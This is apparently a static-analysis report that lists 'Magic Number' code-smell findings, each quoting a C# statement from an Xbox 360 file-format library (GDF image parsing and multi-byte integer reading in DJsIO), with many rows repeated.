Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  	if (xIOIn.Length < 0x1FB20)  		throw GDFExceptions.NotGDF;  	xIOIn.Position = baseoffset = 0x1FB20;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIOIn.Length < 0x30600)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0x30600;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  			if (xIO.Length < 0xFDA0000)  				throw GDFExceptions.NotGDF;  			xIOIn.Position = baseoffset = 0xFDA0000;  			if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  				throw GDFExceptions.NotGDF;  		}  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  	if (xIOIn.Length < 0x1FB20)  		throw GDFExceptions.NotGDF;  	xIOIn.Position = baseoffset = 0x1FB20;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIOIn.Length < 0x30600)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0x30600;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  			if (xIO.Length < 0xFDA0000)  				throw GDFExceptions.NotGDF;  			xIOIn.Position = baseoffset = 0xFDA0000;  			if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  				throw GDFExceptions.NotGDF;  		}  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  	if (xIOIn.Length < 0x30600)  		throw GDFExceptions.NotGDF;  	xIOIn.Position = baseoffset = 0x30600;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIO.Length < 0xFDA0000)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0xFDA0000;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  			throw GDFExceptions.NotGDF;  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  	if (xIOIn.Length < 0x30600)  		throw GDFExceptions.NotGDF;  	xIOIn.Position = baseoffset = 0x30600;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIO.Length < 0xFDA0000)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0xFDA0000;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  			throw GDFExceptions.NotGDF;  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  	if (xIOIn.Length < 0x30600)  		throw GDFExceptions.NotGDF;  	xIOIn.Position = baseoffset = 0x30600;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  		if (xIO.Length < 0xFDA0000)  			throw GDFExceptions.NotGDF;  		xIOIn.Position = baseoffset = 0xFDA0000;  		if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  			throw GDFExceptions.NotGDF;  	}  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  	if (xIO.Length < 0xFDA0000)  		throw GDFExceptions.NotGDF;  	xIOIn.Position = baseoffset = 0xFDA0000;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  		throw GDFExceptions.NotGDF;  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ()) {  	if (xIO.Length < 0xFDA0000)  		throw GDFExceptions.NotGDF;  	xIOIn.Position = baseoffset = 0xFDA0000;  	if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  		throw GDFExceptions.NotGDF;  }  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: if (xIOIn.ReadBytes (20).HexString () != GDFMagic.XMedia.HexString ())  	throw GDFExceptions.NotGDF;  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,GDFImage,The following statement contains a magic number: unknown = xIOIn.ReadBytes (9);  
Magic Number,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,ReadFolder,The following statement contains a magic number: for (int i = 0; i < numz.Count; i++) {  	long pos = (offset + (4 * numz [i]));  	if (pos > barrier)  		continue;  	xIO.Position = pos;  	ushort num = xIO.ReadUInt16 (false);  	if (!numz.Contains (num))  		numz.Add (num);  	num = xIO.ReadUInt16 (false);  	if (!numz.Contains (num))  		numz.Add (num);  	try {  		xents.Add (new GDFEntry (this));  	}  	catch {  	}  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,XSetStrings,The following statement contains a magic number: txtidx = new int[2];  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadInt16,The following statement contains a magic number: try {  	byte[] buff = ReadBytes (2);  	return BitConv.ToInt16 (buff' BigEndian);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt24,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (3);  	if (BigEndian)  		xData.EndianConvert ();  	return ((uint)xData [2] << 16 | (uint)xData [1] << 8 | (uint)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt24,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (3);  	if (BigEndian)  		xData.EndianConvert ();  	return ((uint)xData [2] << 16 | (uint)xData [1] << 8 | (uint)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt24,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (3);  	if (BigEndian)  		xData.EndianConvert ();  	return ((uint)xData [2] << 16 | (uint)xData [1] << 8 | (uint)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt24,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (3);  	if (BigEndian)  		xData.EndianConvert ();  	return ((uint)xData [2] << 16 | (uint)xData [1] << 8 | (uint)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt24,The following statement contains a magic number: return ((uint)xData [2] << 16 | (uint)xData [1] << 8 | (uint)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt24,The following statement contains a magic number: return ((uint)xData [2] << 16 | (uint)xData [1] << 8 | (uint)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt24,The following statement contains a magic number: return ((uint)xData [2] << 16 | (uint)xData [1] << 8 | (uint)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (5);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (5);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (5);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (5);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (5);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (5);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (5);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (5);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt40,The following statement contains a magic number: return ((ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (6);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt48,The following statement contains a magic number: return ((ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: try {  	byte[] xData = ReadBytes (7);  	if (BigEndian)  		xData.EndianConvert ();  	return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  }  catch (Exception x) {  	throw x;  }  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
Magic Number,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,ReadUInt56,The following statement contains a magic number: return ((ulong)xData [6] << 48 | (ulong)xData [5] << 40 | (ulong)xData [4] << 32 | (ulong)xData [3] << 24 | (ulong)xData [2] << 16 | (ulong)xData [1] << 8 | (ulong)xData [0]);  
